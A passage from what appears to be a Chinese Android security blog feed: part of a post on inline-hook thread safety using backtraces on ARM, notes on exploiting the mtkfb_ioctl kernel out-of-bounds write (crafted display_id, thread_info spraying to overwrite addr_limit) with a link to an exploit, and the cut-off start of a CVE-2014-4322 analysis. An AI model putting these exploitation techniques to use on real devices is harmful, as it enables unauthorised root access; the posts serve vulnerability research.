class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;inlineHook.h&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;new_thread&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;new_a\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sleep(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;thread&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;a\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sleep(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; err;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;pthread_t&lt;/span&gt; tid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	err = pthread_create(&amp;amp;tid, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;, thread, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (err) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	pthread_join(tid, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;当我们对要hook的代码前8-10个字节变动的时候，如果子线程刚好执行到此处，或者子线程的函数调用栈包含此处地址，那么有一定几率会导致异常甚至crash。&lt;/p&gt;
&lt;h2 id=&quot;backtrace&quot;&gt;&lt;a href=&quot;#backtrace&quot; class=&quot;headerlink&quot; title=&quot;backtrace&quot;&gt;&lt;/a&gt;backtrace&lt;/h2&gt;&lt;p&gt;为了防止上述情况发生，我们在hook之前需要对当前进程的所有线程做检测，以确保hook的函数不在当前的函数调用栈中。我们可以利用backtrace机制，获取线程的每层调用地址与我们需要hook的函数地址做比较，来实现该检测。&lt;br&gt;栈回溯（backtrace）是指程序运行时打印出当前的调用栈，在程序发生崩溃时，系统常常会打印出栈回溯信息。linux+arm平台下，编译器通过unwind实现栈回溯。&lt;br&gt;&lt;img src=&quot;/images/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform_1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;上面是在Android平台通过kill -3 pid命令打印出的调用栈，包含了调用的函数、具体偏移地址以及现场保存的寄存器信息。我们只需要其中的每一层的调用具体地址即可。不走运的是，NDK中并没有提供直接backtrace的接口函数，查看源码，在dalvik/vm/interp/Stack.cpp的dvmDumpNativeStack函数实现了backtrace的功能，dvmDumpNativeStack源码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;dvmDumpNativeStack&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; DebugOutputTarget* target, &lt;span class=&quot;keyword&quot;&gt;pid_t&lt;/span&gt; tid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;ifdef&lt;/span&gt; HAVE_ANDROID_OS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; MAX_DEPTH = &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;backtrace_frame_t&lt;/span&gt; backtrace[MAX_DEPTH];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ssize_t&lt;/span&gt; frames = unwind_backtrace_thread(tid, backtrace, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, MAX_DEPTH);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (frames &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;backtrace_symbol_t&lt;/span&gt; backtrace_symbols[MAX_DEPTH];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        get_backtrace_symbols(backtrace, frames, backtrace_symbols);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt;(frames); i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; line[MAX_BACKTRACE_LINE_LENGTH];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            format_backtrace_line(i, &amp;amp;backtrace[i], &amp;amp;backtrace_symbols[i],&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    line, MAX_BACKTRACE_LINE_LENGTH);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            dvmPrintDebugMessage(target, &lt;span class=&quot;string&quot;&gt;&quot;  %s\n&quot;&lt;/span&gt;, line);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        free_backtrace_symbols(backtrace_symbols, frames);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dvmPrintDebugMessage(target, &lt;span class=&quot;string&quot;&gt;&quot;  (native backtrace unavailable)\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;dvmDumpNativeStack函数功能为打印指定线程的backtrace，这里是直接将打印信息输出，与需求不符。查阅system/core/libcorkscrew/backtrace.c中的unwind_backtrace_thread函数：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;ssize_t&lt;/span&gt; unwind_backtrace_thread(&lt;span class=&quot;keyword&quot;&gt;pid_t&lt;/span&gt; tid, &lt;span class=&quot;keyword&quot;&gt;backtrace_frame_t&lt;/span&gt;* backtrace,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; ignore_depth, &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; max_depth) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (tid == gettid()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; unwind_backtrace(backtrace, ignore_depth + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, max_depth);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ALOGV(&lt;span class=&quot;string&quot;&gt;&quot;Unwinding thread %d from thread %d.&quot;&lt;/span&gt;, tid, gettid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// &lt;span class=&quot;doctag&quot;&gt;TODO:&lt;/span&gt; there&#39;s no tgkill(2) on Mac OS, so we&#39;d either need the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;// mach_port_t or the pthread_t rather than the tid.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; defined(CORKSCREW_HAVE_ARCH) &amp;amp;&amp;amp; !defined(__APPLE__)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sigaction act;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; sigaction oact;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;memset&lt;/span&gt;(&amp;amp;act, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(act));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    act.sa_sigaction = unwind_backtrace_thread_signal_handler;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    act.sa_flags = SA_RESTART | SA_SIGINFO | SA_ONSTACK;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sigemptyset(&amp;amp;act.sa_mask);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    pthread_mutex_lock(&amp;amp;g_unwind_signal_mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;map_info_t&lt;/span&gt;* milist = acquire_my_map_info_list();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;ssize_t&lt;/span&gt; frames = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!sigaction(SIGURG, &amp;amp;act, &amp;amp;oact)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        g_unwind_signal_state.map_info_list = milist;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        g_unwind_signal_state.backtrace = backtrace;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        g_unwind_signal_state.ignore_depth = ignore_depth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        g_unwind_signal_state.max_depth = max_depth;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里由于函数比较长，只贴出了前部分。其中判断如果线程id为当前线程id，则直接调用unwind_backtrace函数，而unwind_backtrace函数通过调用_Unwind_Backtrace、__Unwind_Backtrace、__gnu_Unwind_Backtrace解析.ARM.extab和.ARM.exidx节（具体解析过程实在有点麻烦，不再深入研究），将每层调用栈的信息存存入类型为backtrace_frame_t的backtrace结构体中，贴出backtrace_frame_t定义：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uintptr_t&lt;/span&gt; absolute_pc;     &lt;span class=&quot;comment&quot;&gt;/* absolute PC offset */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;uintptr_t&lt;/span&gt; stack_top;       &lt;span class=&quot;comment&quot;&gt;/* top of stack for this frame */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; stack_size;         &lt;span class=&quot;comment&quot;&gt;/* size of this stack frame */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;backtrace_frame_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;其中absolute_pc即为调用地址，unwind_backtrace_thread的返回值则为调用栈的层数。&lt;/p&gt;
&lt;h2 id=&quot;方案&quot;&gt;&lt;a href=&quot;#方案&quot; class=&quot;headerlink&quot; title=&quot;方案&quot;&gt;&lt;/a&gt;方案&lt;/h2&gt;&lt;p&gt;最后给出具体的方案：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;遍历/proc/pid/task目录，获得进程下的所有线程id号；&lt;/li&gt;
&lt;li&gt;通过tkill函数向所有线程发SIGSTOP信号；&lt;/li&gt;
&lt;li&gt;通过dlopen、dlsym调用libcorkscrew.so的unwind_backtrace_thread函数，获得所有线程的函数调用栈信息；&lt;/li&gt;
&lt;li&gt;遍历所有线程的函数调用栈信息，将每层调用地址与需要hook的函数作判断，若调用地址均不位于待hook的函数内，则可以安全的进行inline hook，否则停止；&lt;/li&gt;
&lt;li&gt;通过tkill函数向所有线程发生SIGCONT信号；&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Android下打印调试堆栈方法：&lt;a href=&quot;http://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-43405.html#scrolltoc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-43405.html#scrolltoc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Android4.4.2源码：&lt;a href=&quot;http://androidxref.com/4.4.4_r1/xref/system/core/include/corkscrew/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://androidxref.com/4.4.4_r1/xref/system/core/include/corkscrew/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要讨论了Android+ARM平台的backtrace原理以及inlineHook中涉及到的多线程安全的问题。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mtkfb_ioctl函数越界写内存提权漏洞</title>
    <link href="http://ele7enxxh.com/Mtkfb-Exploit.html"/>
    <id>http://ele7enxxh.com/Mtkfb-Exploit.html</id>
    <published>2015-07-30T13:38:00.000Z</published>
    <updated>2016-03-23T06:31:05.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要研究了mtkfb_ioctl函数越界写内存提权漏洞的原理与利用。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;漏洞由nforest@KeenTeam发现，已于2015年年初报给厂商。详细分析请看KeenTeam高级研究员陈良在2015阿里移动技术峰会做出的报告“内存喷射在安卓Root利用中”。&lt;/p&gt;
&lt;h2 id=&quot;一些笔记&quot;&gt;&lt;a href=&quot;#一些笔记&quot; class=&quot;headerlink&quot; title=&quot;一些笔记&quot;&gt;&lt;/a&gt;一些笔记&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;选取display_id为0xA04EC4EC,因为0xA04EC4EC*0x34==0x208FFFFFF0==0x8FFFFFF0,可确保写0操作落在map的地址范围内？&lt;br&gt;dispif_info位于内核空间，故其地址一定大于0xC0000000。所以写0的地址也大于0xC0000000+0xA04EC4EC*0x34+0x20=0x50000010（对于32位系统，addr+0x100000000==addr），而我们map的起始地址0x50000000，所以可确保写0操作落在map的地址范围。&lt;/li&gt;
&lt;li&gt;为什么要进行thread_info喷射？&lt;br&gt;虽然我们对display_id的取值进行了筛选，但是依然无法保证修改的一定是addr_limit。为了增大修改成功的概率，创建尽可能多的线程，以让thread_info结构体充斥在内核空间，大大提高了修改成功率。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;Exp&quot;&gt;&lt;a href=&quot;#Exp&quot; class=&quot;headerlink&quot; title=&quot;Exp&quot;&gt;&lt;/a&gt;Exp&lt;/h2&gt;&lt;p&gt;根据nforest@KeenTeam的报告以及网上大牛的提权代码，整理了一份Exp，已经上传到github了：&lt;br&gt;&lt;a href=&quot;https://github.com/ele7enxxh/MtkfbExploit&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ele7enxxh/MtkfbExploit&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;参考文献&quot;&gt;&lt;a href=&quot;#参考文献&quot; class=&quot;headerlink&quot; title=&quot;参考文献&quot;&gt;&lt;/a&gt;参考文献&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;http://wenku.baidu.com/link?url=E0TX6kLvnMZD7QoS5p3FdZivHcpkeYOBTTvSYFG8EqKsB-VI3yOIR6-NK8n-cMStwxgjIApQYr0M00_4Djkl7OlmEUIXagDxyA0-_dG1E-W&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wenku.baidu.com/link?url=E0TX6kLvnMZD7QoS5p3FdZivHcpkeYOBTTvSYFG8EqKsB-VI3yOIR6-NK8n-cMStwxgjIApQYr0M00_4Djkl7OlmEUIXagDxyA0-_dG1E-W&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/android-rooting-tools/android_run_root_shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/android-rooting-tools/android_run_root_shell&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了mtkfb_ioctl函数越界写内存提权漏洞的原理与利用。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-4322-qseecom内存破坏漏洞分析</title>
    <link href="http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html"/>
    <id>http://ele7enxxh.com/Memory-Corruption-Qseecom-Driver-CVE-2014-4322-Analysis.html</id>
    <published>2015-07-26T06:43:00.000Z</published>
    <updated>2016-03-23T06:31:01.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
